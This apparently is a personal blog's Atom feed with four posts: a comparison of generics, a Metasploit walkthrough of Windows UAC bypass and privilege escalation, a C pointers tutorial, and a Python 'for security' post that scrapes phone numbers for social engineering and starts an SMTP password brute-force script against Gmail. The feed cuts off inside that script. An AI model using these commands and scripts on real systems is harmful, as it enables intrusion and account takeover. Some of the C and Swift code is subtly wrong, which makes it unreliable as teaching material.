<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.4.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2017-06-10T01:49:18+00:00</updated><id>http://localhost:4000/</id><title type="html">./codemuch</title><entry><title type="html">Parametric Polymorphism - A Comparison Across Rust, C++, and Swift</title><link href="http://localhost:4000/2017/06/10/parametric-polymorphism-in-languages.html" rel="alternate" type="text/html" title="Parametric Polymorphism -  A Comparison Across Rust, C++, and Swift" /><published>2017-06-10T00:00:00+00:00</published><updated>2017-06-10T00:00:00+00:00</updated><id>http://localhost:4000/2017/06/10/parametric-polymorphism-in-languages</id><content type="html" xml:base="http://localhost:4000/2017/06/10/parametric-polymorphism-in-languages.html">&lt;p&gt;&lt;strong&gt;Parametric polymorphism&lt;/strong&gt; is one of the key programming paradigms that I’ve realized is
in every expressive, yet powerful programming languages. It is the ability for a language to be able to create data types and structures such that they are able to handle data generically. This enables type safety, as well as programmers not needing to worry about type coercion.&lt;/p&gt;

&lt;p&gt;As a beginner to type systems and generic programming, I’ve come to realize the importance of polymorphism, especially in object-oriented programming. Not only do they enable you to write flexible code and save time doing so, but also be able to compile and debug more efficiently as well.&lt;/p&gt;

&lt;p&gt;Parametric polymorphism are often expressed through &lt;strong&gt;generics&lt;/strong&gt; and &lt;strong&gt;templates&lt;/strong&gt;. Keep in mind that we are referring to &lt;strong&gt;parametric&lt;/strong&gt; polymorphism, whereas polymorphism alone deals with the property of classes in object-oriented language.&lt;/p&gt;

&lt;p&gt;We will be examining such features discussed within three languages: Rust, C++, and Swift.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;swift&quot;&gt;Swift&lt;/h2&gt;

&lt;p&gt;Swift is a high-level language, and therefore programming paradigms such as generics are often tossed under the table due to the high level of abstraction. In Swift, generics are already implemented under a wide variety of data structures, such as dictionaries. Swift’s type inference ensures that no explicit declarations are needed.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;let letters = [&quot;A&quot;: &quot;Apple&quot;, &quot;B:&quot;, &quot;Banana&quot;, &quot;C:&quot;, &quot;Car&quot;]
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;However, that doesn’t really satisfy us. We want to see this action as a powerful feature, not just a commodity within the standard library. Explicit generic declarations are made through the ‘&amp;lt;’ and &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;gt;&lt;/code&gt; syntax, and can be declared over a wide variety of structures. Sounds familiar, Rust programmers? I will look at that later.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// Parametric Polymorphism in functions
func output&amp;lt;MyType&amp;gt;(a: MyType){
  print(output)
}
output(1) // using a numerical Int
output(&quot;dis a string&quot;) // using a String

// Parametric Polymorphism within Classes
class ShoppingList&amp;lt;ShoppingType&amp;gt; {
  var list = [ShoppingType]()
  
  mutating func add(item: ShoppingType) {
    list.append(item)
  }
}

var Keyfood = ShoppingList&amp;lt;String&amp;gt;()
Keyfood.add(&quot;A new item&quot;)
var FoodUniverse = ShoppingList&amp;lt;Int&amp;gt;()
FoodUniverse.add(12)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;One great feature that can be observed within Swift is the idea of being able to overload generics, or in my words, creating &lt;em&gt;smart&lt;/em&gt; generics.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;func doThis(t: Int) -&amp;gt; Int {
  print(&quot;t with a regular ol' method&quot;)
  return t;
}

func doThisBetter&amp;lt;T&amp;gt;(t: T) -&amp;gt; T {
  print(&quot;t but with generic T?&quot;)
  return t;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;c&quot;&gt;C++&lt;/h2&gt;

&lt;p&gt;In C++, &lt;strong&gt;templates&lt;/strong&gt; are considered the foundation of generic programming. Templates are extensible to functions and classes.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; template&amp;lt;typename T&amp;gt;
 void genericity(const T&amp;amp; x) {
   switch (typeof(T)) {  // Conceptual only; not C++
      case int:
        break;
      case std::string:
        break;
      default:
        break;
    }
 }
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;</content><author><name>Alan</name></author><summary type="html">Parametric polymorphism is one of the key programming paradigms that I’ve realized is in every expressive, yet powerful programming languages. It is the ability for a language to be able to create data types and structures such that they are able to handle data generically. This enables type safety, as well as programmers not needing to worry about type coercion.</summary></entry><entry><title type="html">Privilege Escalation in Windows</title><link href="http://localhost:4000/2017/05/14/priv-esc-win.html" rel="alternate" type="text/html" title="Privilege Escalation in Windows" /><published>2017-05-14T00:00:00+00:00</published><updated>2017-05-14T00:00:00+00:00</updated><id>http://localhost:4000/2017/05/14/priv-esc-win</id><content type="html" xml:base="http://localhost:4000/2017/05/14/priv-esc-win.html">&lt;p&gt;Dusting off &lt;code class=&quot;highlighter-rouge&quot;&gt;msfconsole&lt;/code&gt; and the Metasploit framework itself, it was time for me to get back on my feet with penetration testing.&lt;/p&gt;

&lt;p&gt;With the recent ransomware &lt;a href=&quot;http://www.cnn.com/2017/05/14/opinions/wannacrypt-attack-should-make-us-wanna-cry-about-vulnerability-urbelis/&quot;&gt;WannaCry&lt;/a&gt; spreading throughout the globe, I pondered upon the question on how malware is able to attain system-level privileges on a Windows machine, locking it down, and making it near-impossible to circumvent.&lt;/p&gt;

&lt;p&gt;When utilizing Metasploit against Windows targets, its essential to escalate user privileges to &lt;strong&gt;SYSTEM&lt;/strong&gt;, otherwise being stuck on a user account with regular permissions limit the pentest. As penetration testers, privilege escalation is considered the most critical point of the post-exploitation step, and all the hard work from gaining initial access, maintaining persistence and circumventing the anti-virus will all seem meaningless.&lt;/p&gt;

&lt;p&gt;What are some fun things we can do once we attain &lt;strong&gt;SYSTEM&lt;/strong&gt;?&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Attain passwords, including hashes for any accounts on the system (‘hashdump’)&lt;/li&gt;
  &lt;li&gt;Change passwords, create users and change permissions (even administration)&lt;/li&gt;
  &lt;li&gt;Pivot to other workstations&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;A lot of the higher system-level functions of Metasploit rely on gaining system. Many penetration testers work immediately at privilege escalation once the machine is pwn`ed.&lt;/p&gt;

&lt;p&gt;Metasploit’s &lt;code class=&quot;highlighter-rouge&quot;&gt;meterpreter&lt;/code&gt; console comes with some built-in Ruby scripts that can already help with the process.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf exploit(ms08_067_netapi) &amp;gt; exploit
...
meterpreter &amp;gt; getsystem
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;In this case, I utilized the built in &lt;code class=&quot;highlighter-rouge&quot;&gt;getsystem&lt;/code&gt; script. Well, what &lt;strong&gt;exactly&lt;/strong&gt; does &lt;code class=&quot;highlighter-rouge&quot;&gt;getsystem&lt;/code&gt; do? &lt;code class=&quot;highlighter-rouge&quot;&gt;getsystem&lt;/code&gt; works on three different techniques. Although I won’t go in detail about how they work, Cobalt Strike (a Metasploit GUI framework) wrote a &lt;a href=&quot;https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/&quot;&gt;great blog post&lt;/a&gt; about it.&lt;/p&gt;

&lt;p&gt;This exploit, CVE-2008-4250, is one of the staples of vulnerabilities in the early Windows XP operating systems. Yes, Windows &lt;strong&gt;XP&lt;/strong&gt;. What happens if we attempt to gain privileges on a pwn’ed Windows 8 or 10 machine?&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf exploit(handler) &amp;gt; exploit
...
meterpreter &amp;gt; getsystem
[-] priv_elevate_getsystem: Operation failed: The environment is incorrect. The following was attempted:
[-] Named Pipe Impersonation (In Memory/Admin)
[-] Named Pipe Impersonation (Dropper/Admin)
[-] Token Duplication (In Memory/Admin)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Using a standard Veil-Evasion encrypted Meterpreter payload binary, I gained physical access inside my test Windows 10 machine. Not as fun as fileless access, but gets the work done. However, when we attempt to utilize &lt;code class=&quot;highlighter-rouge&quot;&gt;getsystem&lt;/code&gt; this time, all three methods of it ceased to work. Even doing &lt;code class=&quot;highlighter-rouge&quot;&gt;getprivs&lt;/code&gt; doesn’t yield us that many permissions.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; getprivs
============================================================
Enabled Process Privileges
============================================================
SeShutdownPrivilege
SeChangeNotifyPrivilege
SeUndockPrivilege
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;And keep in mind that this is a standard Windows 10 machine WITHOUT any AVs except for the standard Windows Defender. So, what happened?&lt;/p&gt;

&lt;h2 id=&quot;user-account-control&quot;&gt;User Account Control&lt;/h2&gt;

&lt;p&gt;Now’s a great time to talk about Window’s UAC, or User Account Control feature. This feature was implemented as a security feature such that hackers are not able to gain privileges. This means that in order for a regular user to utilize some sort of service of application that is available exclusively to the administrator, a popup prompt will pop out requesting authentication as a Administrator. Sounds familiar? You definitely has seen UAC before, with all its warnings about unknown publishers for some applications, turning off certain features in the Windows settings, etc.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://bit.ly/2qGTpjE&quot; alt=&quot;uac&quot; /&gt;&lt;/p&gt;

&lt;p&gt;On Windows 10, UAC has become much more stricter, such that impersonating SYSTEM with &lt;code class=&quot;highlighter-rouge&quot;&gt;getsystem&lt;/code&gt; becomes much harder … but not impossible.&lt;/p&gt;

&lt;h2 id=&quot;a-few-methods-to-bypass-uac&quot;&gt;A Few Methods to Bypass UAC&lt;/h2&gt;

&lt;p&gt;In order to circumvent this, we need to rely on some different techniques.&lt;/p&gt;

&lt;h3 id=&quot;windows-escalate-uac-protection-bypass&quot;&gt;Windows Escalate UAC Protection Bypass&lt;/h3&gt;

&lt;p&gt;This is a method which spawns a new shell session with UAC disabled as a process. This attack works, however, on the basis that UAC is set as “Notify me only when programs try to make changes to my computer”, which is standard for many operating systems.&lt;/p&gt;

&lt;p&gt;Let’s background our current &lt;code class=&quot;highlighter-rouge&quot;&gt;meterpreter&lt;/code&gt; session and load it up.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; background
[*] Backgrounding session 2...
msf(handler) &amp;gt; use exploit/windows/local/bypassuac
msf(bypassuac) &amp;gt; show targets

Exploit targets:

   Id  Name
   --  ----
   0   Windows x86
   1   Windows x64

msf(bypassuac) &amp;gt; set TARGET 1
TARGET =&amp;gt; 1
msf(bypassuac) &amp;gt; set SESSION 2
SESSION =&amp;gt; 2
msf(bypassuac) &amp;gt; exploit
...
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Once complete, we are able to &lt;code class=&quot;highlighter-rouge&quot;&gt;getsystem&lt;/code&gt; as we did previously.&lt;/p&gt;

&lt;p&gt;Of course, this may not totally work. If UAC is set to “Always Notify”, loading this process as part of memory will fail. Therefore, if you use a build of Windows that is Vista it will not work, as this is feature is default. In this case, the attack against my Windows 10 build failed&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf exploit(bypassuac) &amp;gt; exploit

[*] Started reverse TCP handler on 192.168.1.170:4444 
[-] Exploit aborted due to failure: not-vulnerable: Windows 10 (Build 14393). is not vulnerable.
[*] Exploit completed, but no session was created.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;windows-escalate-uac-protection-bypass-in-memory-injection&quot;&gt;Windows Escalate UAC Protection Bypass (In Memory Injection)&lt;/h3&gt;

&lt;p&gt;This exploit aims to to inject a DLL binary through the Reflective DLL Injection technique. Similar to the previous exploit, it is important to specify the architecture of the machine.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; background
[*] Backgrounding session 2...
msf(handler) &amp;gt; use exploit/windows/local/bypassuac_injection
msf(bypassuac_injection) &amp;gt; show targets

Exploit targets:

   Id  Name
   --  ----
   0   Windows x86
   1   Windows x64

msf(bypassuac_injection) &amp;gt; set TARGET 0
TARGET =&amp;gt; 0
msf(bypassuac_injection) &amp;gt; set SESSION 2
SESSION =&amp;gt; 2
msf(bypassuac_injection) &amp;gt; exploit
...
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;windows-escalate-uac-execute-runas&quot;&gt;Windows Escalate UAC Execute RunAs&lt;/h3&gt;

&lt;p&gt;This last exploit was actually from &lt;a href=&quot;https://www.youtube.com/watch?v=OqmxRIqC3FE&amp;amp;feature=youtu.be&quot;&gt;this Metasploitation video&lt;/a&gt; and was conceived by Hak5’s &lt;a href=&quot;https://room362.com/&quot;&gt;mubix&lt;/a&gt;. I find this privilege escalation method the most effective, but it does add on a caveat of the target user having to explicitly click on a UAC notification. This exploit calls upon the Windows &lt;code class=&quot;highlighter-rouge&quot;&gt;ShellExecute&lt;/code&gt; function to start a shell with UAC-bypassed privileges. Once again, it is important that you set the necessary target architecture.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; background
[*] Backgrounding session 2...
msf(handler) &amp;gt; use exploit/windows/local/ask
msf(ask) &amp;gt; show targets

Exploit targets:

   Id  Name
   --  ----
   0   Windows x86
   1   Windows x64

msf(ask) &amp;gt; set TARGET 0
TARGET =&amp;gt; 0
msf(ask) &amp;gt; set SESSION 2
SESSION =&amp;gt; 2
msf(ask) &amp;gt; exploit
...
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Once executed, UAC will give a prompt to a user. Once completed, the exploit finishes, and you are able to &lt;code class=&quot;highlighter-rouge&quot;&gt;getsystem&lt;/code&gt;.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;Thanks for reading this article! Although I had fun getting my feet wet with Metasploit again, I still am reminded about how uninformed I am about the Win API, and really want to dive into binary exploitation, as well as acquainting myself with the Windows architecture for security-oriented purposes. With that said, expect some more fun stuff in the future combining both penetration testing and programming!&lt;/p&gt;

&lt;p&gt;With that said, stay safe and good luck with your endeavors!&lt;/p&gt;</content><author><name>Alan</name></author><summary type="html">Dusting off msfconsole and the Metasploit framework itself, it was time for me to get back on my feet with penetration testing.</summary></entry><entry><title type="html">Dynamic Memory and Pointers in C</title><link href="http://localhost:4000/2017/04/15/memory-pointers-c.html" rel="alternate" type="text/html" title="Dynamic Memory and Pointers in C" /><published>2017-04-15T00:00:00+00:00</published><updated>2017-04-15T00:00:00+00:00</updated><id>http://localhost:4000/2017/04/15/memory-pointers-c</id><content type="html" xml:base="http://localhost:4000/2017/04/15/memory-pointers-c.html">&lt;p&gt;If you are like me, you love to throw pointer lexicons throughout your code hoping to make all those compiler warnings go away. I mean, you might understand what pointers are, but you don’t really &lt;em&gt;understand&lt;/em&gt; them.&lt;/p&gt;

&lt;p&gt;Here’s a nice rundown of how a pointer works, on a “high” level:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
int main(void){
  int a = 100, *ptr;
  *ptr = a;
  printf(&quot;Memory location of *ptr: %x;\n&quot;, *ptr); 
  printf(&quot;Memory location of a: %x;&quot;,  a);

  printf(&quot;The value of (*ptr)++ is: %d&quot;, (*ptr)++ )

  /* Of course, you might be tempted to do this:
  int b, *ptr2;
  int *ptr2 = 100;
  int *ptr2 = b;

 RED FLAG! A pointer is a representation of memory, and in no way is it    
 an integer. */
 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;and a representation of the code in a lower level:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;amp;a = 0x123              &amp;amp;ptr = 0x456    
-----------             ---------------
| a = 100 | &amp;lt;---------- |*ptr = 0x123 |
-----------             ---------------
    a++     &amp;lt;----------     (*ptr)++
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Now that’s nice and fun, but what is the purpose of utilizing pointers? C, unlike your modern Python and Javascript, utilizes pointers to modify data more efficiently. For example, C does not have a built-in string type, resulting in people utilizing arrays of characters, or as some people in cybersecurity call it, a &lt;em&gt;buffer&lt;/em&gt;.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;char * name[100] = &quot;Alan&quot;;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Languages such as Python aren’t as &lt;strong&gt;explicit&lt;/strong&gt; as C, where it is not necessary to declare the type and/or cast of a variable. This makes the language much more tolerable for impatient people like me.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;name = &quot;Alan&quot;;
name = 1; # of course, with mutability, I can change the type easily.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Because of this, Python is &lt;em&gt;dynamically&lt;/em&gt; typed. We will explore that later.&lt;/p&gt;

&lt;p&gt;With all this talk about pointers, it still seems a little confusing right? Let me show you one pragmatic example of using pointers in C. Let’s say that I have a function, &lt;code class=&quot;highlighter-rouge&quot;&gt;swap()&lt;/code&gt;, and it is in charge of swapping two integer values that is passed, like so: &lt;code class=&quot;highlighter-rouge&quot;&gt;swap(int a, int b)&lt;/code&gt;. Let’s write this in code, and see what we get.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;

void swap(int val1, int val2); // function prototype 

void swap(int val1, int val2){  
  int temp = val1; // hold value of a in temp variable
  val1 = val2;    // change value of a to b
  val2 = temp;      // change value of b to temp, which holds the value of a.
}

int main(void){
  int a = 1, b = 2;
  printf(&quot;Before swap: a = %i; b = %i\n&quot;, a, b); 
  swap(a, b); // a represents val1, b represents val2
  printf(&quot;After swap: a = %i; b = %i\n&quot;, a, b);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The program looks fine, but once compiled:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ gcc swap.c -o swap
$ ./swap
Before swap: a = 1; b = 2
After swap: a = 1; b = 2
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;What happened? This is the work of the &lt;em&gt;stack&lt;/em&gt;. When we are allocating memory on the &lt;em&gt;stack&lt;/em&gt;, that memory is attached to a thread of execution. Once complete, all memory goes away. For a structure such as a function, that means that the data allocated within its scope will eventually be deallocated. That means once &lt;code class=&quot;highlighter-rouge&quot;&gt;swap()&lt;/code&gt; finishes its thread of execution, the values (which will have been swapped) passed through parameters have fallen out of scope, and the next output will print the same as the first output, since it is in the scope of &lt;code class=&quot;highlighter-rouge&quot;&gt;main()&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Of course, let’s reexamine this example with pointers.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;

void swap(int *val1, int *val2); 

// I won't write any comments here. Try to interpret the code yourself.

void swap(int *val1, int *val2){  
  int temp = *val1; 
  *val1 = *val2;      
  *val2 = temp;      
}

int main(void){
  int a = 1, b = 2;
  printf(&quot;Before swap: a = %i; b = %i\n&quot;, a, b); 
  swap(&amp;amp;a, &amp;amp;b); 
  printf(&quot;After swap: a = %i; b = %i\n&quot;, a, b);
}

---

$ gcc swap.c -o swap
$ ./swap
Before swap: a = 1; b = 2
After swap: a = 2; b = 1
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Remember, pointers are not individual data types, but rather a representation of memory with an origination. When we are working with &lt;code class=&quot;highlighter-rouge&quot;&gt;val1&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;val2&lt;/code&gt;, we were simply passing the values of &lt;code class=&quot;highlighter-rouge&quot;&gt;a&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;b&lt;/code&gt; to it, not the actual memory address. However, once we declare &lt;code class=&quot;highlighter-rouge&quot;&gt;*val1&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;*val2&lt;/code&gt; as pointers, we can visualize an arrow that links the pointers to the memory locations of &lt;code class=&quot;highlighter-rouge&quot;&gt;a&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;b&lt;/code&gt;, or as seen in the code, &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;amp;a&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;amp;b&lt;/code&gt;. The rules of the stack and memory management are still enforced, but once the values within the &lt;code class=&quot;highlighter-rouge&quot;&gt;swap()&lt;/code&gt; function falls out of scope, the values of &lt;code class=&quot;highlighter-rouge&quot;&gt;a&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;b&lt;/code&gt; have already been swapped, through our trusty pointers.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;With all this talk about memory, I want to introduce one more concept: dynamic memory allocation. While we were writing our code above, we have worked with &lt;em&gt;static&lt;/em&gt; types. This means that we explicitly declared each of our types, and when we compile the program, these data values, their types and sizes are recognized during &lt;strong&gt;compile-time&lt;/strong&gt;. This enables the compiler to allocate memory safely. Going back to our comparison with C and Python: since we do not explicitly declare the types of variables and other structures in Python, it is a &lt;em&gt;dynamically&lt;/em&gt; typed language. Despite that, this does not mean that we cannot dynamically allocate memory in C.&lt;/p&gt;

&lt;p&gt;When we declare an array, we know that it has a fixed size of elements. It’s size, type, etc. are all known to the compiler as well.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;int array[10];
// we use %zu, since sizeof() returns size_t
printf(&quot;Size of array[]: %zu&quot;, sizeof(array)); // =&amp;gt; 40; 4 bits for each element
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;How about doing this dynamically? We use the &lt;code class=&quot;highlighter-rouge&quot;&gt;malloc()&lt;/code&gt; function from &lt;code class=&quot;highlighter-rouge&quot;&gt;stdlib.h&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
...
int * array = malloc(10 * sizeof(int)); 
// using malloc, we allocate 40 bits, since the sizeof(int) is 4 bits.

if (array == NULL) { 
  // IF however, we are unable to allocate that, the array returns NULL. This is how we would handle this.
  
  fprintf(stderr, &quot;Could not allocate!\n&quot;); // print to STDERR. Errno can work too.
  return(-1);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Neat feature right? This is important, especially when you work with user input. Using dynamic memory can prevent cases of buffer and stack overflows in memory, but it is important to &lt;strong&gt;free&lt;/strong&gt; dynamically allocated memory. C, unlike languages like Rust and Java, does NOT have garbage collectors.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;free(array);
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;There are of course, other methods of dynamic memory allocations in C. You may have heard of &lt;code class=&quot;highlighter-rouge&quot;&gt;calloc()&lt;/code&gt;, which is similar to ‘malloc()’.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;So that’s a litle bit of a rundown on pointers, static and dynamic memory, and dynamic memory allocation in C.&lt;/p&gt;

&lt;p&gt;Thanks for reading!&lt;/p&gt;</content><author><name>Alan</name></author><summary type="html">If you are like me, you love to throw pointer lexicons throughout your code hoping to make all those compiler warnings go away. I mean, you might understand what pointers are, but you don’t really understand them.</summary></entry><entry><title type="html">Python for Security</title><link href="http://localhost:4000/2017/04/08/python-for-security.html" rel="alternate" type="text/html" title="Python for Security" /><published>2017-04-08T00:00:00+00:00</published><updated>2017-04-08T00:00:00+00:00</updated><id>http://localhost:4000/2017/04/08/python-for-security</id><content type="html" xml:base="http://localhost:4000/2017/04/08/python-for-security.html">&lt;p&gt;Python is one of the greatest programming languages for hackers. Not because of its easiness actually, but it is &lt;strong&gt;beginner-friendly&lt;/strong&gt; and &lt;strong&gt;fast to deploy&lt;/strong&gt;. One of the best thing about the language is the resemblance to that of a natural language, sharing syntactical and semantical rules that very much look like English.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;for i in range(0, 50):
  print &quot;Hello&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Without a doubt, Python has that pseudocode feel that gives it the edge of being an &lt;em&gt;ideal&lt;/em&gt; language for the greenhorn. But still, with the vast variety of libraries, modules and frameworks available for the language, the use of Python is also incredibly &lt;strong&gt;expansive&lt;/strong&gt;. In this article, we are going to implement Python for the intent of penetration testing.&lt;/p&gt;

&lt;p&gt;Take &lt;strong&gt;Black Hat Python&lt;/strong&gt; for example. Great book. Ever wanted to build a quick TCP server? Simple. Implement &lt;code class=&quot;highlighter-rouge&quot;&gt;socket&lt;/code&gt;. Make an object, connect, send some header data, and await a response. Working with networking and TCP/IP has never been easier.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;host = &quot;www.test.com&quot;
port = 80
obj = socket(socket.AF_INET, socket.SOCK_STREAM)
obj.send(&quot;GET / HTTP/1.1\r\nHost:&quot; + host + &quot;\r\n\r\n&quot;)
response = obj.recv(4096)
print response
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The point is, with an ever growing collection of Python libraries and easy to deploy code, Python is ideal for the modern hacker. If you ever look at some of the source code for popular pentesting tools, you will see a large
amount of Python.&lt;/p&gt;

&lt;p&gt;Well, today I’m more of here to talk to about some applicable code you can use in pentesting situations, where you may not always have access to a Kali machine. And maybe with some ingenuity, you can even execute
this code on a mobile device. So here are my favorite Pythonic recipes.&lt;/p&gt;

&lt;h2 id=&quot;1-extract-phone-numbers&quot;&gt;1. Extract Phone Numbers&lt;/h2&gt;
&lt;p&gt;Let’s start off with something simple. Say we want to siphon some Phone Numbers from a document or some sort of webpage. We want to social engineer these numbers, but the page is just spewing a ton of bullshit we don’t care much for.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import re, urllib
url = &quot;www.test.com/contact.html&quot;
htmlFile = urllib.urlopen(url)
  	html = htmlFile.read()
phoneNums = re.findall(r'^(\+\d{1,2}\s)?\(?\d{3}\)?[\s.-]\d{3}[\s.-]\d{4}$', html)
print phoneNums
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The core component that you need to understand is 5th line, where you would see a random string. What is it?
That is known as a &lt;strong&gt;regular expression&lt;/strong&gt;. This is basically a special string that signifies a specific
pattern to look for. That specific regex specified looks for standard phone-numbers in these formats:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;###-###-####
(###) ###-####
### ### ####
###.###.####
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;a href=&quot;http://stackoverflow.com/questions/16699007/regular-expression-to-match-standard-10-digit-phone-number&quot;&gt;(source for regex)&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;2-hacking-smtp-email&quot;&gt;2. Hacking SMTP (email)&lt;/h2&gt;

&lt;p&gt;With the vast collection of modules for Python, there obviously is one for &lt;strong&gt;SMTP&lt;/strong&gt;, also known as &lt;strong&gt;&lt;em&gt;Simple
Mail Transfer Protocol&lt;/em&gt;&lt;/strong&gt;. This is the protocol utilized by email services. Let’s make a simple script that launches a dictionary attack on a sample Gmail account (can be utilized on other SMTP services, such as Yahoo).&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import smtplib
username = &quot;hackme@gmail.com&quot;
# Specify a wordlist
wordlist = open(&quot;wordlist.txt&quot;, 'r')
for i in wordlist.readlines():
      password = i.strip(&quot;\n&quot;)
      try:
          s = smtplib.SMTP(&quot;smtp.gmail.com&quot;, 587)
          s.ehlo() # identify self to server to confirm working
          s.starttls() # start secure connect
